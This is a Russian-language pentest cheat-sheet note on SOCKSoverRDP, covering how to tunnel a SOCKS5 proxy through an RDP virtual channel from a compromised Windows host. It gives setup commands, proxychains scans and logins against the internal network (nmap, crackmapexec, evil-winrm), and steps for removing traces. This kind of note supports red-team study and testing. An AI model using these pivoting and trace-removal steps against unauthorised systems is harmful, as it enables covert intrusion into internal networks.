#tool #pivoting #windows #RDP #socks

> **SOCKSoverRDP** — инструмент для создания SOCKS5-прокси через уже установленное RDP-соединение.  
   Использует механизм виртуальных каналов (Dynamic Virtual Channels) протокола RDP для туннелирования трафика.

**SOCKSoverRDP** позволяет осуществлять **Pivoting** через RDP без дополнительных портов и соединений.

## Оглавление
- [[#Как это работает]]
- [[#Компоненты]]
- [[#Установка и использование]]
- [[#Использование Proxychains]]
- [[#Через xfreerdp3]]

---

# Как это работает

1. На машине атакующего регистрируется DLL-плагин для `mstsc.exe` — он создаёт виртуальный канал RDP.
2. На скомпрометированном Windows-хосте запускается `SocksOverRDP-Server.exe` — он принимает данные через этот канал.
3. После установки RDP-сессии между ними поднимается SOCKS5-прокси на `127.0.0.1:1080` у атакующего.
4. Весь трафик через порт 1080 идёт во внутреннюю сеть жертвы через RDP-туннель.

> Ключевой момент:
   Туннель едет внутри уже разрешённого RDP (порт 3389). Новые порты не открываются.

---

# Компоненты

| Файл | Где запускать | Роль |
|---|---|---|
| `SocksOverRDP-Plugin.dll` | Машина атакующего | Плагин для mstsc, создаёт virtual channel |
| `SocksOverRDP-Server.exe` | Скомпрометированный хост | Сервер SOCKS, принимает данные из канала |

---

# Установка и использование

### 1. На машине атакующего (Windows)

Регистрируем DLL-плагин:
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

Проверить регистрацию:
```cmd
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns\SocksOverRDP-Plugin"
```

### 2. На скомпрометированном хосте

Загружаем и запускаем сервер (любым удобным способом):
```powershell
# Передать через RDP clipboard или certutil/iwr
.\SocksOverRDP-Server.exe
```

По умолчанию сервер слушает на `0.0.0.0:1080` через virtual channel.

### 3. Устанавливаем RDP-сессию

С машины атакующего подключаемся через стандартный `mstsc`:
```cmd
mstsc /v:TARGET_IP
```

После входа в сессию — SOCKS5 поднимется автоматически на `127.0.0.1:1080`.

<span style="background:#b1ffff">> SOCKS-прокси живёт только пока активна RDP-сессия!</span>

---

# Использование Proxychains

После установки сессии настраиваем proxychains:

`/etc/proxychains4.conf`
```bash
socks5 127.0.0.1 1080
```

Теперь можно работать с внутренней сетью:
```bash
proxychains nmap -Pn -sT -p 445,80,443 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.50 -u Administrator -p 'pass'
```

---

# Через xfreerdp3

Если атакующий на Linux — `mstsc` нет. Используем `xfreerdp3` с плагином через `/load-balance-info` или `/vchannel`.

Альтернатива: собрать `SocksOverRDP-Plugin` под Linux-совместимый FreeRDP plugin (нестандартно, сложнее).

<span style="background:#b1ffff">> РЕКОМЕНДАЦИЯ: для Linux-пивотинга через RDP лучше использовать Chisel или Ligolo-ng.</span>
<span style="background:#b1ffff">> SOCKSoverRDP наиболее удобен с Windows-машины атакующего.</span>

---

# Удаление следов

Снять регистрацию плагина на машине атакующего:
```cmd
regsvr32.exe /u SocksOverRDP-Plugin.dll
```

Убить серверный процесс на жертве:
```powershell
Stop-Process -Name SocksOverRDP-Server -Force
```